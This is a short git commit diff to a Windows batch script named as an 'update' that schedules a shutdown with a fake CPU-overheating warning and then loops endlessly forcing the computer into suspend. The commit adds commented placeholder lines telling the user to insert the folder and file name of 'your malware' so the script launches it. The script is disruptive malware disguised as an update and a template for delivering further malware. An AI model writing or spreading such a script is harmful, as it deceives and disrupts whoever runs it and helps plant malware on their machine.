7ada557d5beaf836a21d91e5f8f2ada37ebe501b
Damien <60195761+Damien-code@users.noreply.github.com>
2022-02-04 17:30:28 +0100

    Update Update4.5_Lite_edition.bat

--- Update4.5_Lite_edition.bat
+++ Update4.5_Lite_edition.bat
@@ -8,6 +8,8 @@ shutdown /s /t 99 /c " Surchauffe CPU. "
 timeout /t 5
 shutdown /a
 timeout /t 3
+:: cd put here the path to your folder that contains the malware and remove the ":: "
+:: start put here the name of your malware and add the name of the file extension and remove the ":: "
 :loop
 %windir%\System32\rundll32.exe powrprof.dll,SetSuspendState 0,1,0
 %windir%\System32\rundll32.exe powrprof.dll,SetSuspendState 0,1,0
